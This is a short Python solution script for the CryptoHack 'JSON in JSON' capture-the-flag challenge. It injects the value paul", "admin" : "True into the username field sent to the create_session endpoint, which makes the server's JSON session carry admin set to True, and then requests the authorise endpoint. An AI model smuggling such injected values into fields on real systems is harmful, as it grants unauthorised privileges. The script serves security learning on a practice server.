"""
    JSON in JSON challenge

https://web.cryptohack.org/json-in-json/

create_session()
-> body = {"admin": "False", "username": " + str(input) + "}


crypto{https://owasp.org/www-community/Injection_Theory}
"""

import jwt
import requests
import json
base_url = "http://web.cryptohack.org/json-in-json"

# TEST
SECRET_KEY = "secret"
username = "paul" + '", "admin" : "' + "True"
body = '{' + '"admin": "' + "False" + '", "username": "' + str(username) + '"}'
print(f"body : {body}")

print(f"payload : {json.loads(body)}")
encoded = jwt.encode(json.loads(body), SECRET_KEY, algorithm='HS256')
print(f"encoded : {encoded}")

decode = jwt.decode(encoded, SECRET_KEY, algorithms=['HS256'])
print(f"decode : {decode}")
# END TEST


json_content = "paul" + '", "admin" : "' + "True"
print(json_content)
print(str(json_content))

resp = requests.get(base_url + "/create_session/" + json_content + '/')
json_resp = resp.json()
session = json_resp["session"]

print(f"session : {session}")

resp = requests.get(base_url + "/authorise/" + session + '/')
json_resp = resp.json()
if "response" in json_resp:
    output = json_resp["response"]
else:
    output = json_resp["error"]

print(f"output : {output}")